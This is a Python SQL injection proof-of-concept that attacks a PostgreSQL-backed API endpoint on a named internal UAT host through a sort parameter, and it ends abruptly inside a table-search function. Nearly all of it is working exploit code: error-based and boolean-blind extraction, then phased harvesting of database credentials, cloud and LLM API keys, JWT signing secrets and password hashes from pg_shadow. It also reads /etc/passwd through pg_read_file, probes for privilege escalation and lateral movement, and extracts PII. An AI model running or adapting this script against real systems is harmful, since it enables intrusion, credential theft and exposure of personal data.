#!/usr/bin/env python3
"""
SQLi PoC - IDP Extractor (colId parameter)
Boolean-Blind & Error-Based extraction for PostgreSQL
Target: POST /api/v1/maker-checker/teams/list
Phases 1-8: Full exploitation covering all PostgreSQL attack vectors
"""

import requests
import sys
import json
import urllib3
import re
import argparse
import time
import os
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET_URL = "https://idp.uat.nam.nsroot.net/api/v1/maker-checker/teams/list"


class SQLiExtractor:
    def __init__(self, cookie, token, proxy=None, output_dir=None):
        self.session = requests.Session()
        self.session.verify = False
        self.cookie = cookie
        self.token = token
        self.headers = {
            "Content-Type": "application/json;charset=UTF-8",
            "Accept": "application/json",
            "Origin": "https://idp.uat.nam.nsroot.net",
            "Referer": "https://idp.uat.nam.nsroot.net/studio/maker-checker",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:154.0) Gecko/20100101 Firefox/154.0",
            "Cookie": cookie,
            "Authorization": f"Bearer {token}",
        }
        self.proxies = {"https": proxy, "http": proxy} if proxy else {}
        self.request_count = 0
        self.findings = []
        self.output_dir = output_dir or "sqli_output"
        os.makedirs(self.output_dir, exist_ok=True)
        self.log_file = open(
            os.path.join(self.output_dir, f"sqli_log_{datetime.now():%Y%m%d_%H%M%S}.txt"),
            "w", encoding="utf-8"
        )
        self.progress_file = os.path.join(self.output_dir, "progress.json")
        self.completed_queries = self._load_progress()
        self.auth_fail_count = 0

    # ── Progress save/load for resume ────────────────────────────
    def _load_progress(self):
        if os.path.exists(self.progress_file):
            try:
                with open(self.progress_file, "r", encoding="utf-8") as f:
                    data = json.load(f)
                    print(f"[*] Loaded {len(data)} cached results from previous run")
                    return data
            except Exception:
                pass
        return {}

    def _save_progress(self):
        with open(self.progress_file, "w", encoding="utf-8") as f:
            json.dump(self.completed_queries, f, indent=2)

    # ── Token refresh ─────────────────────────────────────────────
    def _check_auth(self, response):
        if response is None:
            return True
        expired = (
            response.status_code in (401, 403)
            or "unauthorized" in response.text.lower()
            or "token" in response.text.lower() and "expired" in response.text.lower()
            or "invalid token" in response.text.lower()
            or "jwt" in response.text.lower() and "expired" in response.text.lower()
        )
        if expired:
            self.auth_fail_count += 1
            if self.auth_fail_count >= 3:
                self._pause_for_token()
                return False
        else:
            self.auth_fail_count = 0
        return not expired

    def _pause_for_token(self):
        self._save_progress()
        self.log("\n" + "!" * 60)
        self.log(" TOKEN EXPIRED — Session paused")
        self.log(f" Progress saved ({len(self.completed_queries)} queries cached)")
        self.log("!" * 60)
        self.log("\n  Get a fresh token from Burp/browser, then paste it below.")
        self.log("  Type 'q' to quit (you can resume later with --resume).\n")

        while True:
            new_token = input("  New JWT token (or 'q' to quit): ").strip()
            if new_token.lower() == "q":
                self.log("[*] Quitting. Run with --resume to continue later.")
                self.print_summary({})
                sys.exit(0)

            new_cookie = input("  New cookie (press Enter to keep current): ").strip()
            if new_cookie:
                self.cookie = new_cookie
                self.headers["Cookie"] = new_cookie

            self.token = new_token
            self.headers["Authorization"] = f"Bearer {new_token}"
            self.auth_fail_count = 0

            self.log("[*] Testing new token...")
            if self.test():
                self.log("[+] New token works! Resuming...\n")
                break
            else:
                self.log("[-] Token still invalid. Try again.\n")

    def log(self, msg):
        print(msg)
        self.log_file.write(msg + "\n")
        self.log_file.flush()

    def finding(self, severity, title, value):
        entry = {"severity": severity, "title": title, "value": value}
        self.findings.append(entry)
        self.log(f"  [{'!' * severity}] FINDING ({severity}/5): {title}")
        self.log(f"       Value: {value[:200]}")

    def _send(self, colid_value):
        body = {
            "sortModel": [{"colId": colid_value, "sort": "asc"}],
            "teamType": "myTeams",
        }
        self.request_count += 1
        try:
            r = self.session.post(
                TARGET_URL, json=body, headers=self.headers,
                proxies=self.proxies, timeout=30,
            )
            if not self._check_auth(r):
                r = self.session.post(
                    TARGET_URL, json=body, headers=self.headers,
                    proxies=self.proxies, timeout=30,
                )
                self.request_count += 1
            return r
        except Exception as e:
            self.log(f"  [!] Request error: {e}")
            return None

    # ── Error-based extraction (1 request per value) ──────────────
    def error_extract(self, query):
        payload = f"CAST(({query})::text AS integer)"
        r = self._send(f"(SELECT {payload})")
        if r is None:
            return None
        m = re.search(
            r'invalid input syntax for (?:type )?integer:\s*["\\\']+'
            r'([^"\\\']+)',
            r.text,
        )
        if m:
            return m.group(1)
        return None

    # ── Boolean check ─────────────────────────────────────────────
    def bool_check(self, condition):
        payload = f"(SELECT (CASE WHEN ({condition}) THEN 1 ELSE 1/(SELECT 0) END))"
        r = self._send(payload)
        if r is None:
            return None
        if "division by zero" in r.text.lower():
            return False
        return True

    # ── Boolean-blind binary-search extraction ────────────────────
    def blind_extract(self, query, max_len=300):
        length = None
        for i in range(1, max_len + 1):
            c = self.bool_check(f"LENGTH(({query})::text)={i}")
            if c is True:
                length = i
                break
            if c is None:
                return None
        if length is None:
            if self.bool_check(f"({query}) IS NULL") is True:
                return "[NULL]"
            return None

        result = ""
        for pos in range(1, length + 1):
            lo, hi = 32, 126
            while lo < hi:
                mid = (lo + hi) // 2
                c = self.bool_check(
                    f"ASCII(SUBSTRING(({query})::text,{pos},1))>{mid}"
                )
                if c is True:
                    lo = mid + 1
                else:
                    hi = mid
            result += chr(lo)
            sys.stdout.write(f"\r  [*] ({pos}/{length}) {result}")
            sys.stdout.flush()
        print()
        return result

    # ── Smart extract: cache check → error-based → boolean ────────
    def extract(self, query, label=""):
        if label:
            self.log(f"\n[>] {label}")

        cache_key = query.strip()
        if cache_key in self.completed_queries:
            cached = self.completed_queries[cache_key]
            self.log(f"  [+] {cached}  (cached from previous run)")
            return cached

        val = self.error_extract(query)
        if val:
            self.log(f"  [+] {val}  (error-based)")
            self.completed_queries[cache_key] = val
            self._save_progress()
            return val
        self.log("  [*] Falling back to boolean-blind...")
        val = self.blind_extract(query)
        if val:
            self.log(f"  [+] {val}")
        else:
            self.log("  [-] No result")
        self.completed_queries[cache_key] = val
        self._save_progress()
        return val

    # ── Quick boolean yes/no check ────────────────────────────────
    def check_exists(self, condition, label=""):
        if label:
            self.log(f"\n[>] {label}")
        result = self.bool_check(condition)
        if result is True:
            self.log("  [+] YES")
        elif result is False:
            self.log("  [-] NO")
        else:
            self.log("  [?] UNKNOWN")
        return result

    # ── Verify injection works ────────────────────────────────────
    def test(self):
        self.log("[*] Testing injection...")
        t = self.bool_check("1=1")
        f = self.bool_check("1=2")
        if t is True and f is False:
            self.log("[+] Boolean injection CONFIRMED\n")
            return True
        self.log("[-] Injection test FAILED - check cookie/token")
        return False

    # ══════════════════════════════════════════════════════════════
    # PHASE 1 — DATABASE RECONNAISSANCE
    # ══════════════════════════════════════════════════════════════
    def phase1_recon(self):
        self.log("\n" + "=" * 60)
        self.log(" PHASE 1 - DATABASE RECONNAISSANCE")
        self.log("=" * 60)
        info = {}
        queries = [
            ("Current User",        "SELECT current_user"),
            ("Current Database",    "SELECT current_database()"),
            ("DB Version",          "SELECT version()"),
            ("Is Superuser",        "SELECT current_setting('is_superuser')"),
            ("Server Address",      "SELECT host(inet_server_addr())"),
            ("Server Port",         "SELECT inet_server_port()::text"),
            ("Data Directory",      "SELECT current_setting('data_directory')"),
            ("Config File",         "SELECT current_setting('config_file')"),
            ("HBA File",            "SELECT current_setting('hba_file')"),
            ("Log Directory",       "SELECT current_setting('log_directory')"),
            ("All Databases",       "SELECT string_agg(datname,', ') FROM pg_database WHERE datallowconn"),
            ("All Schemas",         "SELECT string_agg(schema_name,', ') FROM information_schema.schemata"),
            ("Search Path",         "SELECT current_setting('search_path')"),
            ("Max Connections",     "SELECT current_setting('max_connections')"),
            ("SSL Enabled",         "SELECT current_setting('ssl')"),
            ("Listen Addresses",    "SELECT current_setting('listen_addresses')"),
            ("Shared Preload Libs", "SELECT current_setting('shared_preload_libraries')"),
        ]
        for label, q in queries:
            info[label] = self.extract(q, label)
        return info

    # ══════════════════════════════════════════════════════════════
    # PHASE 2 — SENSITIVE COLUMN DISCOVERY
    # ══════════════════════════════════════════════════════════════
    def phase2_columns(self):
        self.log("\n" + "=" * 60)
        self.log(" PHASE 2 - SENSITIVE COLUMN DISCOVERY")
        self.log("=" * 60)
        patterns = [
            "%password%", "%passwd%", "%secret%", "%token%",
            "%api_key%", "%apikey%", "%credential%",
            "%private_key%", "%access_key%", "%secret_key%",
            "%client_secret%", "%client_id%", "%auth%",
            "%passport%", "%ssn%", "%certificate%",
            "%conn_str%", "%connection_string%", "%endpoint%",
            "%bucket%", "%region%", "%account_id%",
        ]
        like_clauses = " OR ".join(f"column_name ILIKE '{p}'" for p in patterns)

        count = self.extract(
            f"SELECT COUNT(*)::text FROM information_schema.columns "
            f"WHERE table_schema='gssp_common' AND ({like_clauses})",
            "Total sensitive columns",
        )

        results = []
        limit = int(count) if count and count.isdigit() else 30
        for i in range(limit):
            val = self.extract(
                f"SELECT column_name||' -> '||table_name "
                f"FROM information_schema.columns "
                f"WHERE table_schema='gssp_common' AND ({like_clauses}) "
                f"ORDER BY table_name,column_name LIMIT 1 OFFSET {i}",
                f"Column {i + 1}",
            )
            if not val or val == "[NULL]":
                break
            results.append(val)
            self.finding(3, f"Sensitive column: {val}", val)
        return results

    # ══════════════════════════════════════════════════════════════
    # PHASE 3 — HIGH-VALUE DATA EXTRACTION
    # ══════════════════════════════════════════════════════════════
    def phase3_secrets(self):
        self.log("\n" + "=" * 60)
        self.log(" PHASE 3 - HIGH-VALUE DATA EXTRACTION")
        self.log("=" * 60)

        targets = [
            ("Settings with 'password'",
             "SELECT value FROM gssp_common.settings WHERE LOWER(value) LIKE '%password%' LIMIT 1"),
            ("Settings with 'secret'",
             "SELECT value FROM gssp_common.settings WHERE LOWER(value) LIKE '%secret%' LIMIT 1"),
            ("Settings with 'key'",
             "SELECT value FROM gssp_common.settings WHERE LOWER(value) LIKE '%key%' AND LOWER(value) NOT LIKE '%keyword%' LIMIT 1"),
            ("Settings with 'token'",
             "SELECT value FROM gssp_common.settings WHERE LOWER(value) LIKE '%token%' LIMIT 1"),
            ("Settings with 'http'",
             "SELECT value FROM gssp_common.settings WHERE LOWER(value) LIKE '%http%' LIMIT 1"),
            ("Settings with connection string",
             "SELECT value FROM gssp_common.settings WHERE LOWER(value) LIKE '%jdbc%' OR LOWER(value) LIKE '%postgresql://%' OR LOWER(value) LIKE '%mongodb://%' LIMIT 1"),
            ("Team credentials sample",
             "SELECT * FROM gssp_common.idp_team_credentials LIMIT 1"),
            ("Kafka config columns",
             "SELECT string_agg(column_name,', ') FROM information_schema.columns WHERE table_schema='gssp_common' AND table_name='kafka_config'"),
            ("Data source config columns",
             "SELECT string_agg(column_name,', ') FROM information_schema.columns WHERE table_schema='gssp_common' AND table_name='idp_data_source_config'"),
            ("Generation config columns",
             "SELECT string_agg(column_name,', ') FROM information_schema.columns WHERE table_schema='gssp_common' AND table_name='generation_config'"),
            ("Actions request_tokens sample",
             "SELECT request_tokens::text FROM gssp_common.actions WHERE request_tokens IS NOT NULL LIMIT 1"),
            ("Actions response_tokens sample",
             "SELECT response_tokens::text FROM gssp_common.actions WHERE response_tokens IS NOT NULL LIMIT 1"),
            ("User profile sample",
             "SELECT * FROM gssp_common.idp_feedback_user_profile LIMIT 1"),
        ]

        results = {}
        for label, q in targets:
            val = self.extract(q, label)
            if val and val != "[NULL]":
                results[label] = val
                if any(kw in val.lower() for kw in ["password", "secret", "key=", "token"]):
                    self.finding(5, f"Credential in {label}", val)
        return results

    # ══════════════════════════════════════════════════════════════
    # PHASE 4 — PRIVILEGE ESCALATION
    # ══════════════════════════════════════════════════════════════
    def phase4_escalation(self):
        self.log("\n" + "=" * 60)
        self.log(" PHASE 4 - PRIVILEGE ESCALATION CHECKS")
        self.log("=" * 60)

        checks = [
            ("Superuser accounts",
             "SELECT string_agg(rolname,', ') FROM pg_roles WHERE rolsuper=true"),
            ("Roles with CREATEROLE",
             "SELECT string_agg(rolname,', ') FROM pg_roles WHERE rolcreaterole=true"),
            ("Current user role memberships",
             "SELECT string_agg(roleid::regrole::text,', ') FROM pg_auth_members WHERE member=(SELECT oid FROM pg_roles WHERE rolname=current_user)"),
            ("SET ROLE targets",
             "SELECT string_agg(rolname,', ') FROM pg_roles WHERE pg_has_role(current_user,oid,'SET') AND rolname!=current_user"),
            ("SECURITY DEFINER functions in gssp_common",
             "SELECT proname||' owned by '||proowner::regrole::text FROM pg_proc WHERE prosecdef=true AND pronamespace=(SELECT oid FROM pg_namespace WHERE nspname='gssp_common') LIMIT 1"),
            ("All SECURITY DEFINER functions",
             "SELECT COUNT(*)::text FROM pg_proc WHERE prosecdef=true"),
            ("dblink extension",
             "SELECT extname FROM pg_extension WHERE extname='dblink'"),
            ("pg_read_file /etc/hostname",
             "SELECT pg_read_file('/etc/hostname',0,50)"),
            ("pg_read_file /etc/passwd",
             "SELECT pg_read_file('/etc/passwd',0,200)"),
            ("Large objects count",
             "SELECT COUNT(*)::text FROM pg_largeobject"),
            ("Extensions installed",
             "SELECT string_agg(extname,', ') FROM pg_extension"),
            ("INSERT access",
             "SELECT table_name FROM information_schema.table_privileges WHERE grantee=current_user AND privilege_type='INSERT' AND table_schema='gssp_common' LIMIT 1"),
            ("UPDATE access",
             "SELECT table_name FROM information_schema.table_privileges WHERE grantee=current_user AND privilege_type='UPDATE' AND table_schema='gssp_common' LIMIT 1"),
            ("DELETE access",
             "SELECT table_name FROM information_schema.table_privileges WHERE grantee=current_user AND privilege_type='DELETE' AND table_schema='gssp_common' LIMIT 1"),
            ("Row Level Security policies",
             "SELECT tablename||': '||policyname FROM pg_policies WHERE schemaname='gssp_common' LIMIT 1"),
        ]

        results = {}
        for label, q in checks:
            val = self.extract(q, label)
            if val and val != "[NULL]":
                results[label] = val
                if label in ("SET ROLE targets", "INSERT access", "UPDATE access"):
                    self.finding(5, label, val)
                if "pg_read_file" in label and val and "permission denied" not in val.lower():
                    self.finding(5, f"FILE READ: {label}", val)
        return results

    # ══════════════════════════════════════════════════════════════
    # PHASE 5 — CLOUD & SERVICE CREDENTIALS
    # ══════════════════════════════════════════════════════════════
    def phase5_cloud_creds(self):
        self.log("\n" + "=" * 60)
        self.log(" PHASE 5 - CLOUD & SERVICE CREDENTIAL HUNTING")
        self.log("=" * 60)

        # Get all app tables first
        table_count = self.extract(
            "SELECT COUNT(*)::text FROM information_schema.tables "
            "WHERE table_schema='gssp_common' AND table_type='BASE TABLE'",
            "App table count",
        )

        searches = [
            # AWS credentials
            ("AWS Access Key (AKIA pattern)",
             "SELECT t::text FROM gssp_common.settings t WHERE t::text LIKE '%AKIA%' LIMIT 1"),
            ("AWS in generation_config",
             "SELECT string_agg(column_name,', ') FROM information_schema.columns "
             "WHERE table_schema='gssp_common' AND table_name='generation_config'"),
            ("Generation config sample row",
             "SELECT * FROM gssp_common.generation_config LIMIT 1"),

            # Azure
            ("Azure connection string",
             "SELECT value FROM gssp_common.settings WHERE LOWER(value) LIKE '%defaultendpointsprotocol%' OR LOWER(value) LIKE '%accountkey%' LIMIT 1"),
            ("Azure in any table",
             "SELECT value FROM gssp_common.settings WHERE LOWER(value) LIKE '%azure%' LIMIT 1"),

            # S3 full config with all columns
            ("S3 config full columns",
             "SELECT string_agg(column_name,', ') FROM information_schema.columns "
             "WHERE table_schema='gssp_common' AND table_name='idp_s3_config'"),

            # OAuth / OIDC
            ("OAuth client_id in settings",
             "SELECT value FROM gssp_common.settings WHERE LOWER(value) LIKE '%client_id%' OR LOWER(value) LIKE '%client.id%' LIMIT 1"),
            ("OAuth client_secret in settings",
             "SELECT value FROM gssp_common.settings WHERE LOWER(value) LIKE '%client_secret%' OR LOWER(value) LIKE '%client.secret%' LIMIT 1"),

            # JDBC / Database connection strings
            ("JDBC connection strings",
             "SELECT value FROM gssp_common.settings WHERE LOWER(value) LIKE '%jdbc:%' LIMIT 1"),
            ("PostgreSQL connection string",
             "SELECT value FROM gssp_common.settings WHERE LOWER(value) LIKE '%postgresql://%' LIMIT 1"),
            ("MongoDB connection",
             "SELECT value FROM gssp_common.settings WHERE LOWER(value) LIKE '%mongodb%' LIMIT 1"),

            # Redis
            ("Redis connection",
             "SELECT value FROM gssp_common.settings WHERE LOWER(value) LIKE '%redis://%' OR LOWER(value) LIKE '%redis.host%' LIMIT 1"),

            # Kafka full config
            ("Kafka config sample",
             "SELECT * FROM gssp_common.kafka_config LIMIT 1"),

            # Data source config full
            ("Data source config sample",
             "SELECT * FROM gssp_common.idp_data_source_config LIMIT 1"),

            # SMTP / Email
            ("SMTP credentials",
             "SELECT value FROM gssp_common.settings WHERE LOWER(value) LIKE '%smtp%' LIMIT 1"),

            # Generic API keys
            ("API key in settings",
             "SELECT value FROM gssp_common.settings WHERE LOWER(value) LIKE '%apikey%' OR LOWER(value) LIKE '%api_key%' OR LOWER(value) LIKE '%api-key%' LIMIT 1"),

            # Encryption keys
            ("Encryption key in settings",
             "SELECT value FROM gssp_common.settings WHERE LOWER(value) LIKE '%encrypt%key%' OR LOWER(value) LIKE '%aes%' OR LOWER(value) LIKE '%cipher%' LIMIT 1"),
        ]

        results = {}
        for label, q in searches:
            val = self.extract(q, label)
            if val and val != "[NULL]":
                results[label] = val
                if any(kw in val.upper() for kw in ["AKIA", "ACCOUNTKEY", "CLIENT_SECRET", "JDBC:", "PASSWORD"]):
                    self.finding(5, f"CRITICAL - {label}", val)
                elif any(kw in val.lower() for kw in ["http", "redis", "mongodb", "smtp"]):
                    self.finding(4, f"Service URL - {label}", val)
        return results

    # ══════════════════════════════════════════════════════════════
    # PHASE 6 — JWT SECRET & AUTH TOKEN THEFT
    # ══════════════════════════════════════════════════════════════
    def phase6_jwt_auth(self):
        self.log("\n" + "=" * 60)
        self.log(" PHASE 6 - JWT SECRET & AUTH TOKEN HUNTING")
        self.log("=" * 60)

        searches = [
            # JWT signing secret / private key
            ("JWT secret in settings",
             "SELECT value FROM gssp_common.settings WHERE LOWER(value) LIKE '%jwt%secret%' OR LOWER(value) LIKE '%jwt%key%' OR LOWER(value) LIKE '%signing%key%' LIMIT 1"),
            ("Private key in settings",
             "SELECT value FROM gssp_common.settings WHERE LOWER(value) LIKE '%private%key%' OR LOWER(value) LIKE '%-----BEGIN%' LIMIT 1"),
            ("RSA/EC key in settings",
             "SELECT value FROM gssp_common.settings WHERE LOWER(value) LIKE '%rsa%' OR LOWER(value) LIKE '%BEGIN PRIVATE%' OR LOWER(value) LIKE '%BEGIN RSA%' LIMIT 1"),
            ("HMAC secret",
             "SELECT value FROM gssp_common.settings WHERE LOWER(value) LIKE '%hmac%' OR LOWER(value) LIKE '%hs256%' OR LOWER(value) LIKE '%hs384%' OR LOWER(value) LIKE '%hs512%' LIMIT 1"),

            # Session tokens / active sessions
            ("Active sessions table check",
             "SELECT table_name FROM information_schema.tables WHERE table_schema='gssp_common' AND (table_name LIKE '%session%' OR table_name LIKE '%token%') LIMIT 1"),

            # Search for bearer tokens stored in DB
            ("Bearer tokens in actions",
             "SELECT request_tokens::text FROM gssp_common.actions WHERE request_tokens::text LIKE '%Bearer%' OR request_tokens::text LIKE '%eyJ%' LIMIT 1"),

            # Search for cookie values
            ("Cookie/session values in DB",
             "SELECT value FROM gssp_common.settings WHERE LOWER(value) LIKE '%session%' AND LOWER(value) LIKE '%secret%' LIMIT 1"),

            # OAuth tokens
            ("OAuth/refresh tokens",
             "SELECT value FROM gssp_common.settings WHERE LOWER(value) LIKE '%refresh%token%' OR LOWER(value) LIKE '%access%token%' LIMIT 1"),

            # LLM/AI API keys (OpenAI, Azure OpenAI, etc.)
            ("OpenAI API key",
             "SELECT value FROM gssp_common.settings WHERE LOWER(value) LIKE '%sk-proj-%' OR LOWER(value) LIKE '%sk-org-%' OR LOWER(value) LIKE '%openai%key%' LIMIT 1"),
            ("AI/LLM endpoint config",
             "SELECT value FROM gssp_common.settings WHERE LOWER(value) LIKE '%openai%' OR LOWER(value) LIKE '%azure.com/openai%' OR LOWER(value) LIKE '%anthropic%' OR LOWER(value) LIKE '%api.openai%' LIMIT 1"),
            ("LLM key in generation_config",
             "SELECT * FROM gssp_common.generation_config WHERE generation_config::text ILIKE '%key%' OR generation_config::text ILIKE '%secret%' LIMIT 1"),

            # Search prompt_template for embedded keys
            ("Prompt template with embedded credentials",
             "SELECT prompt_id FROM gssp_common.prompt_template WHERE prompt_template::text ILIKE '%key%' OR prompt_template::text ILIKE '%password%' OR prompt_template::text ILIKE '%secret%' LIMIT 1"),

            # Webhook secrets
            ("Webhook secrets",
             "SELECT value FROM gssp_common.settings WHERE LOWER(value) LIKE '%webhook%' OR LOWER(value) LIKE '%hook%secret%' LIMIT 1"),
        ]

        results = {}
        for label, q in searches:
            val = self.extract(q, label)
            if val and val != "[NULL]":
                results[label] = val
                if any(kw in val.lower() for kw in ["-----begin", "sk-proj", "sk-org", "bearer eyj"]):
                    self.finding(5, f"CRITICAL - {label}", val)
                elif any(kw in val.lower() for kw in ["secret", "jwt", "hmac", "private"]):
                    self.finding(4, f"Auth secret - {label}", val)
        return results

    # ══════════════════════════════════════════════════════════════
    # PHASE 7 — ADVANCED POSTGRESQL ATTACK VECTORS
    # ══════════════════════════════════════════════════════════════
    def phase7_advanced(self):
        self.log("\n" + "=" * 60)
        self.log(" PHASE 7 - ADVANCED POSTGRESQL EXPLOITATION")
        self.log("=" * 60)

        checks = [
            # ── pg_stat_statements: leaked queries with creds ──
            ("pg_stat_statements extension",
             "SELECT extname FROM pg_extension WHERE extname='pg_stat_statements'"),
            ("Queries with passwords in pg_stat_statements",
             "SELECT query FROM pg_stat_statements WHERE query ILIKE '%password%' LIMIT 1"),
            ("Queries with credentials in pg_stat_statements",
             "SELECT query FROM pg_stat_statements WHERE query ILIKE '%secret%' OR query ILIKE '%token%' LIMIT 1"),

            # ── Foreign Data Wrappers (lateral movement) ──
            ("Foreign Data Wrappers",
             "SELECT string_agg(fdwname,', ') FROM pg_foreign_data_wrapper"),
            ("Foreign servers (connection targets)",
             "SELECT srvname||' -> '||srvoptions::text FROM pg_foreign_server LIMIT 1"),
            ("User mappings (stored creds for FDW)",
             "SELECT umuser::regrole::text||': '||umoptions::text FROM pg_user_mapping LIMIT 1"),

            # ── dblink: check if usable (READ-ONLY check, no connection made) ──
            ("dblink available to current user",
             "SELECT has_function_privilege(current_user,'dblink_connect(text)','EXECUTE')::text"),

            # ── Large Objects: read-only check ──
            ("Large object count (read-only)",
             "SELECT COUNT(*)::text FROM pg_largeobject"),
            ("Large object existing sample",
             "SELECT encode(data,'escape') FROM pg_largeobject WHERE pageno=0 LIMIT 1"),

            # ── pg_cron (persistence) ──
            ("pg_cron extension",
             "SELECT extname FROM pg_extension WHERE extname='pg_cron'"),
            ("Existing cron jobs",
             "SELECT jobname||': '||schedule||' -> '||command FROM cron.job LIMIT 1"),

            # ── Custom functions (potential backdoors) ──
            ("Custom functions in gssp_common",
             "SELECT proname||'('||pg_get_function_arguments(oid)||')' FROM pg_proc WHERE pronamespace=(SELECT oid FROM pg_namespace WHERE nspname='gssp_common') LIMIT 1"),
            ("Custom function count",
             "SELECT COUNT(*)::text FROM pg_proc WHERE pronamespace=(SELECT oid FROM pg_namespace WHERE nspname='gssp_common')"),
            ("Functions with SECURITY DEFINER (privesc)",
             "SELECT proname||' -> '||proowner::regrole::text FROM pg_proc WHERE prosecdef=true AND pronamespace NOT IN (SELECT oid FROM pg_namespace WHERE nspname IN ('pg_catalog','information_schema')) LIMIT 1"),

            # ── Triggers (hidden logic) ──
            ("Triggers on app tables",
             "SELECT trigger_name||' on '||event_object_table FROM information_schema.triggers WHERE trigger_schema='gssp_common' LIMIT 1"),

            # ── pgcrypto (encryption keys) ──
            ("pgcrypto extension",
             "SELECT extname FROM pg_extension WHERE extname='pgcrypto'"),

            # ── Temp table creation (write test) ──
            # Not testing this since it requires stacked queries

            # ── Password hashes ──
            ("Password hash from pg_shadow",
             "SELECT passwd FROM pg_shadow WHERE passwd IS NOT NULL LIMIT 1"),
            ("Password hash from pg_authid",
             "SELECT rolpassword FROM pg_authid WHERE rolpassword IS NOT NULL LIMIT 1"),

            # ── pg_settings secrets ──
            ("pg_settings with passwords",
             "SELECT name||'='||setting FROM pg_settings WHERE setting ILIKE '%password%' OR setting ILIKE '%secret%' LIMIT 1"),
            ("pg_settings authentication",
             "SELECT name||'='||setting FROM pg_settings WHERE name ILIKE '%auth%' OR name ILIKE '%password%' LIMIT 1"),

            # ── Backup schema pillaging ──
            ("Backup schema tables",
             "SELECT string_agg(table_name,', ') FROM information_schema.tables WHERE table_schema='gssp_common_backup' AND table_type='BASE TABLE'"),
            ("Backup schema credentials",
             "SELECT * FROM gssp_common_backup.idp_team_credentials LIMIT 1"),
            ("Backup settings with secrets",
             "SELECT value FROM gssp_common_backup.settings WHERE LOWER(value) LIKE '%secret%' OR LOWER(value) LIKE '%password%' OR LOWER(value) LIKE '%key%' LIMIT 1"),

            # ── Outdated schema (may have old secrets) ──
            ("Outdated schema tables",
             "SELECT string_agg(table_name,', ') FROM information_schema.tables WHERE table_schema='gssp_common_outdated' AND table_type='BASE TABLE'"),
            ("Outdated settings with secrets",
             "SELECT value FROM gssp_common_outdated.settings WHERE LOWER(value) LIKE '%secret%' OR LOWER(value) LIKE '%password%' LIMIT 1"),

            # ── Cross-database access ──
            ("Cross-db access test",
             "SELECT datname FROM pg_database WHERE datname != current_database() AND datallowconn LIMIT 1"),
        ]

        results = {}
        for label, q in checks:
            val = self.extract(q, label)
            if val and val != "[NULL]":
                results[label] = val
                if "pg_stat_statements" in label and "password" in label.lower():
                    self.finding(5, f"LEAKED QUERY CREDS: {label}", val)
                if "Foreign" in label or "User mapping" in label:
                    self.finding(5, f"FDW LATERAL MOVEMENT: {label}", val)
                if "lo_import" in label:
                    self.finding(5, "FILE READ via Large Objects", val)
                if "hash" in label.lower() or "passwd" in label.lower():
                    self.finding(5, f"PASSWORD HASH: {label}", val)
                if "cron" in label.lower() and "job" in label.lower():
                    self.finding(4, f"PERSISTENCE: {label}", val)
        return results

    # ══════════════════════════════════════════════════════════════
    # PHASE 8 — PII & COMPLIANCE DATA
    # ══════════════════════════════════════════════════════════════
    def phase8_pii(self):
        self.log("\n" + "=" * 60)
        self.log(" PHASE 8 - PII & COMPLIANCE DATA")
        self.log("=" * 60)

        # First check what columns exist in user-related tables
        pii_checks = [
            # Direct PII columns
            ("PII columns in all tables",
             "SELECT column_name||' -> '||table_name FROM information_schema.columns "
             "WHERE table_schema='gssp_common' AND ("
             "column_name ILIKE '%email%' OR column_name ILIKE '%phone%' OR "
             "column_name ILIKE '%address%' OR column_name ILIKE '%name%' OR "
             "column_name ILIKE '%passport%' OR column_name ILIKE '%ssn%' OR "
             "column_name ILIKE '%national_id%' OR column_name ILIKE '%dob%' OR "
             "column_name ILIKE '%birth%' OR column_name ILIKE '%salary%' OR "
             "column_name ILIKE '%account_num%' OR column_name ILIKE '%card%' OR "
             "column_name ILIKE '%pan%' OR column_name ILIKE '%aadhaar%' OR "
             "column_name ILIKE '%social%' OR column_name ILIKE '%employee%'"
             ") LIMIT 1"),

            # User profile data
            ("User profiles data",
             "SELECT * FROM gssp_common.idp_feedback_user_profile LIMIT 1"),

            # Feedback table may contain user data
            ("Feedback with user data",
             "SELECT string_agg(column_name,', ') FROM information_schema.columns WHERE table_schema='gssp_common' AND table_name='idp_feedback'"),
            ("Feedback sample",
             "SELECT * FROM gssp_common.idp_feedback LIMIT 1"),

            # Evidence tables
            ("Evidence columns",
             "SELECT string_agg(column_name,', ') FROM information_schema.columns WHERE table_schema='gssp_common' AND table_name='evidence'"),
            ("Evidence sample",
             "SELECT * FROM gssp_common.evidence LIMIT 1"),

            # Review logs (who did what)
            ("Review logs columns",
             "SELECT string_agg(column_name,', ') FROM information_schema.columns WHERE table_schema='gssp_common' AND table_name='review_logs'"),
            ("Review log sample with user info",
             "SELECT * FROM gssp_common.review_logs LIMIT 1"),

            # Control teams
            ("Control teams data",
             "SELECT * FROM gssp_common.control_teams LIMIT 1"),

            # Search all tables for email patterns
            ("Email in actions table",
             "SELECT actions::text FROM gssp_common.actions WHERE actions::text LIKE '%@%.%' LIMIT 1"),

            # Drafts may contain sensitive docs
            ("Drafts columns",
             "SELECT string_agg(column_name,', ') FROM information_schema.columns WHERE table_schema='gssp_common' AND table_name='drafts'"),
            ("Drafts sample",
             "SELECT * FROM gssp_common.drafts LIMIT 1"),

            # Search idp_feedback for document content
            ("Feedback count (data volume)",
             "SELECT COUNT(*)::text FROM gssp_common.idp_feedback"),

            # Row count of all tables (data volume for report)
            ("Total rows in actions",
             "SELECT COUNT(*)::text FROM gssp_common.actions"),
            ("Total rows in evidence",
             "SELECT COUNT(*)::text FROM gssp_common.evidence"),
            ("Total rows in reviews",
             "SELECT COUNT(*)::text FROM gssp_common.reviews"),
        ]

        results = {}
        for label, q in pii_checks:
            val = self.extract(q, label)
            if val and val != "[NULL]":
                results[label] = val
                if any(kw in val.lower() for kw in ["@", "passport", "ssn", "email", "phone"]):
                    self.finding(4, f"PII EXPOSURE: {label}", val)
        return results

    # ══════════════════════════════════════════════════════════════
    # SEARCH ALL TABLES FOR A KEYWORD
    # ══════════════════════════════════════════════════════════════
    def search_all_tables(self, keyword):
        self.log(f"\n{'=' * 60}")
        self.log(f" SEARCHING ALL TABLES FOR: {keyword}")
        self.log("=" * 60)

        count = self.extract(
            "SELECT COUNT(*)::text FROM information_schema.tables "
            "WHERE table_schema='gssp_common' AND table_type='BASE TABLE'",
            "Table count",
        )
        if not count or not count.isdigit():
            return

        for i in range(int(count)):
            tbl = self.extract(
                "SELECT table_name FROM information_schema.tables "
                "WHERE table_schema='gssp_common' AND table_type='BASE TABLE' "
                f"ORDER BY table_name LIMIT 1 OFFSET {i}",
            )
            if not tbl or tbl == "[NULL]":
